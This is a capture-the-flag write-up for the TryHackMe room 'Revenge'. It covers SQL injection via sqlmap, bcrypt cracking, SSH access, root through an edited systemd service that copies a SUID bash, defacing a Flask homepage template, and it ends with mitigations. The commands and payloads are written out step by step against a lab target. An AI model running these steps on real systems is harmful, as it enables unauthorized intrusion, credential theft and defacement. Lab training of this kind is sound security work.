# Revenge

Room: https://tryhackme.com/room/revenge

You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?

There is a sister room to this one. If you have not completed Blog yet, I recommend you do so. It's not required but may enhance the story for you.

All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to Varg. Thanks for helping me out with this one, bud. 

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/revenge.md

----------------

## Overview

This room involved compromising a Flask web application, abusing a SQL injection vulnerability, cracking a bcrypt password hash, logging in over SSH, and finally defacing the front page of the website as required by the objective.

Objective:

> Break into the server running the website and deface the front page without taking the site down.

---

## Task Note 
-----------

```
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy

---

## Port Scanning

I started with an Nmap scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt <TARGET_IP>
````

Interesting ports:

```text
22/tcp open  ssh
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The target was running SSH and a web server on port 80.

---

## Web Fingerprinting

I used WhatWeb to fingerprint the site:

```bash
whatweb http://<TARGET_IP>
```

Output:

```text
http://<TARGET_IP> [200 OK] Country[RESERVED][ZZ], Email[websupport@rubberduckyinc.org], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[<TARGET_IP>], JQuery, Script, Title[Home | Rubber Ducky Inc.], nginx[1.18.0]
```

Useful findings:

```text
Title: Home | Rubber Ducky Inc.
Server: nginx/1.18.0 on Ubuntu
Email: websupport@rubberduckyinc.org
Tech: HTML5, jQuery
```

---

## Directory Enumeration

I ran Gobuster with common extensions:

```bash
gobuster dir -u http://<TARGET_IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,bak,zip \
  -o gobuster-medium-ext.txt
```

This found:

```text
/requirements.txt
```

Opening it revealed the Python dependencies:

```bash
curl http://<TARGET_IP>/requirements.txt
```

```text
attrs==19.3.0
bcrypt==3.1.7
cffi==1.14.1
click==7.1.2
Flask==1.1.2
Flask-Bcrypt==0.7.1
Flask-SQLAlchemy==2.4.4
itsdangerous==1.1.0
Jinja2==2.11.2
MarkupSafe==1.1.1
pycparser==2.20
PyMySQL==0.10.0
six==1.15.0
SQLAlchemy==1.3.18
Werkzeug==1.0.1
```

This confirmed the web application was likely a Flask app using SQLAlchemy and MySQL.

---

## Source Code Disclosure

Since `requirements.txt` was exposed, I checked for common Flask files.

```bash
curl -i http://<TARGET_IP>/app.py
```

This returned the Flask source code.

Important parts:

```python
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:<REDACTED>@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)

app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:<REDACTED>@localhost/duckyinc')
```

The app leaked MySQL credentials for the `duckyinc` database.

The vulnerable route was:

```python
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()
    return render_template('product.html', title=product_selected[1], result=product_selected)
```

The vulnerable line:

```python
rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
```

The `product_id` value is inserted directly into the SQL query, making the `/products/<product_id>` route vulnerable to SQL injection.

---

## SQL Injection

The vulnerable endpoint was:

```text
/products/<product_id>
```

I tested the route manually:

```bash
curl -i 'http://<TARGET_IP>/products/1'
curl -i 'http://<TARGET_IP>/products/1%20OR%201=1'
curl -i 'http://<TARGET_IP>/products/1%20AND%201=2'
```

Then I used sqlmap to enumerate the database:

```bash
sqlmap -u 'http://<TARGET_IP>/products/1' --batch --dbs
```

The interesting database was:

```text
duckyinc
```

I listed tables:

```bash
sqlmap -u 'http://<TARGET_IP>/products/1' -D duckyinc --tables --batch
```

Interesting tables:

```text
product
user
system_user
```

I dumped the database:

```bash
sqlmap -u 'http://<TARGET_IP>/products/1' -D duckyinc --dump --batch
```

The `user` table contained customer data, bcrypt hashes, and one flag hidden inside the `credit_card` field:

```text
mandrews | credit_card | thm{br3ak...}
```

The `system_user` table contained system usernames and bcrypt password hashes:

```text
server-admin | sadmin@duckyinc.org  | $2a$08$...
kmotley      | kmotley@duckyinc.org | $2a$12$...
dhughes      | dhughes@duckyinc.org | $2a$12$...
```

The most interesting account was:

```text
server-admin
```

The hash for this account used bcrypt cost `08`, while the others used cost `12`, making it the easiest target to crack.

---

## Cracking the bcrypt Hash

I saved the hashes to a file:

```bash
cat > system_user.hashes <<'EOF'
server-admin:<BCRYPT_HASH>
kmotley:<BCRYPT_HASH>
dhughes:<BCRYPT_HASH>
EOF
```

Then I cracked them with John:

```bash
john system_user.hashes --wordlist=/usr/share/wordlists/rockyou.txt
john --show system_user.hashes
```

The `server-admin` hash cracked successfully:

```text
server-admin:<REDACTED>
```

---

## SSH Access

I reused the cracked password over SSH:

```bash
ssh server-admin@<TARGET_IP>
```

After logging in, I checked my user and groups:

```bash
id
```

Output:

```text
uid=1001(server-admin) gid=1001(server-admin) groups=1001(server-admin),33(www-data)
```

The important detail was that `server-admin` was a member of the `www-data` group.

---

## Sudo Enumeration

I checked sudo permissions:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for server-admin on ip-10-67-138-182:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on ip-10-67-138-182:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
```

The user could:

```text
sudoedit /etc/systemd/system/duckyinc.service
sudo systemctl daemon-reload
sudo systemctl restart duckyinc.service
```

This meant I could edit the service file and restart it as root.

---

## Inspecting the Service

I checked the DuckyInc service file:

```bash
cat /etc/systemd/system/duckyinc.service
```

Original service:

```ini
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

This service runs the Flask app through Gunicorn.

Because I could edit the service file and restart it with root privileges, I could abuse `ExecStart`.

---

## Privilege Escalation via systemd

I edited the service file:

```bash
sudoedit /etc/systemd/system/duckyinc.service
```

I replaced the original service with a one-shot command that copied Bash to `/tmp` and set the SUID bit:

```ini
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'

[Install]
WantedBy=multi-user.target
```

Then I reloaded systemd and restarted the service:

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

This created a SUID Bash binary:

```bash
ls -la /tmp/rootbash
```

Then I used it to get a root shell:

```bash
/tmp/rootbash -p
id
```

Output showed root privileges:

```text
uid=1001(server-admin) gid=1001(server-admin) euid=0(root) groups=1001(server-admin),33(www-data)
```

At this point, root access was achieved.

---

## Restoring the Website

Changing the service to a one-shot command stopped the Gunicorn backend from running normally.

The website returned:

```text
502 Bad Gateway
```

This happened because nginx was still running, but it could no longer reach the Gunicorn socket:

```text
/var/www/duckyinc/duckyinc.sock
```

Since the objective specifically said not to bring down the site, I restored the original service file.

```bash
sudoedit /etc/systemd/system/duckyinc.service
```

I put the original Gunicorn service back:

```ini
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

Then I reloaded and restarted the service:

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

I checked the service status:

```bash
sudo /bin/systemctl status duckyinc.service --no-pager
```

Once Gunicorn was running again, the website came back online.

---

## Defacing the Front Page

With root access achieved and the website restored, I moved on to the actual objective: defacing the front page without breaking the site.

The Flask app lived in:

```text
/var/www/duckyinc
```

The homepage template was in:

```text
/var/www/duckyinc/templates/index.html
```

I checked the template directory:

```bash
ls -la /var/www/duckyinc/templates
```

I made a backup of the homepage template:

```bash
cp /var/www/duckyinc/templates/index.html /tmp/index.html.bak
```

Then I edited the homepage template:

```bash
nano /var/www/duckyinc/templates/index.html
```

I added a harmless defacement message near the top of the page:

```html
<h1>Defaced by server-admin PWNED</h1>
```

Then I refreshed the homepage:

```text
http://<TARGET_IP>/
```

The front page displayed the defacement message while the site stayed online.

---

## Final Flag

After defacing the front page, the final flag became available.

From the root shell:

```bash
ls
cat flag3.txt
```

Output:

```text
thm{m1ss10n...}
```

---

## Attack Path Summary

```text
Nmap scan
→ HTTP service found on port 80
→ WhatWeb identifies Rubber Ducky Inc. site
→ Gobuster finds /requirements.txt
→ Flask stack identified
→ /app.py source code exposed
→ MySQL credentials leaked
→ SQL injection found in /products/<product_id>
→ sqlmap dumps duckyinc database
→ user table reveals one flag
→ system_user table reveals bcrypt hashes
→ server-admin hash cracked
→ SSH login as server-admin
→ sudo -l reveals sudoedit permission over duckyinc.service
→ modify ExecStart to create SUID Bash
→ restart service as root
→ get root shell with /tmp/rootbash -p
→ restore original Gunicorn service after 502
→ edit /var/www/duckyinc/templates/index.html
→ deface homepage
→ read final flag
```

---

## Notes

The root escalation worked because `server-admin` could edit a systemd service file and restart the service as root.

The risky part was that replacing the Gunicorn `ExecStart` command stopped the web backend, which caused a temporary `502 Bad Gateway`.

The correct recovery was to restore the original service file and restart the service.

For the final objective, the safe defacement method was editing the Flask homepage template rather than leaving the service modified.

---

## Fixes / Mitigations

### Do not expose source files

Files like these should never be directly accessible from the web root:

```text
app.py
requirements.txt
.env
config.py
backup.zip
source.zip
```

The web server should only expose intended static files.

---

### Protect secrets

Database credentials should not be hardcoded in source code.

Bad:

```python
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:password@localhost/duckyinc'
```

Better:

```python
import os

app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get("DATABASE_URL")
```

---

### Do not use MySQL root for the web app

The Flask app connected to MySQL as `root`.

A web app should use a low-privilege database account with only the permissions it needs.

Example:

```sql
CREATE USER 'duckyapp'@'localhost' IDENTIFIED BY '<strong-password>';
GRANT SELECT, INSERT, UPDATE ON duckyinc.* TO 'duckyapp'@'localhost';
FLUSH PRIVILEGES;
```

---

### Prevent SQL Injection

The vulnerable query was:

```python
rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
```

Use parameterised queries instead.

Example:

```python
rs = con.execute(
    "SELECT * FROM product WHERE id = %s",
    (product_id,)
)
```

Or use SQLAlchemy ORM safely.

---

### Avoid dangerous sudo rules

This permission was dangerous:

```text
sudoedit /etc/systemd/system/duckyinc.service
systemctl restart duckyinc.service
```

A user who can edit a root-run service and restart it can generally execute commands as root.

Avoid giving users write access to service files unless they are trusted administrators.

---

### Restrict web file permissions

The `server-admin` user was in the `www-data` group, which helped with modifying web content.

Production web files should have strict ownership and permissions.

Example:

```text
root:root owns application code
www-data can read only what it needs
deployment users have controlled write access
```

---

## Loot

```text
Database: duckyinc
Interesting tables: user, system_user
SSH user: server-admin
Privilege escalation: sudoedit + systemctl service restart
Final flag location: flag3.txt
```


